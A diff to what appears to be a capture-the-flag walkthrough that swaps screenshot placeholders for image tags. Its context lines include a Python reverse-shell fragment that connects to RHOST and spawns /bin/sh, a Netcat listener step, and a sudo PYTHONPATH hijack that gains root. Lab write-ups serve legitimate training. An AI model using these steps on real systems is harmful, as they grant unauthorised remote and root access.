@@ -89,7 +89,7 @@ su hazel
 cat /home/hazel/user.txt
 ```
 
-[SCREEN01]
+<img width="600" height="251" alt="SCREEN01" src="https://github.com/user-attachments/assets/2909ee68-72e9-4c5f-94c7-e0c9f97141a9" />
 
 ---
 
@@ -166,7 +166,7 @@ s.connect((RHOST, RPORT))
 pty.spawn("/bin/sh")
 ```
 
-[SCREEN03]
+<img width="770" height="604" alt="SCREEN03" src="https://github.com/user-attachments/assets/09c21217-c629-4eff-9900-50cac89ac17d" />
 
 5. On the attack machine, start a Netcat listener to catch the incoming root shell.
 
@@ -186,4 +186,4 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 cat /root/root.txt
 ```
 
-[SCREEN02]
+<img width="291" height="169" alt="SCREEN02" src="https://github.com/user-attachments/assets/1a099d77-1f9b-42cd-8340-6b022d972746" />
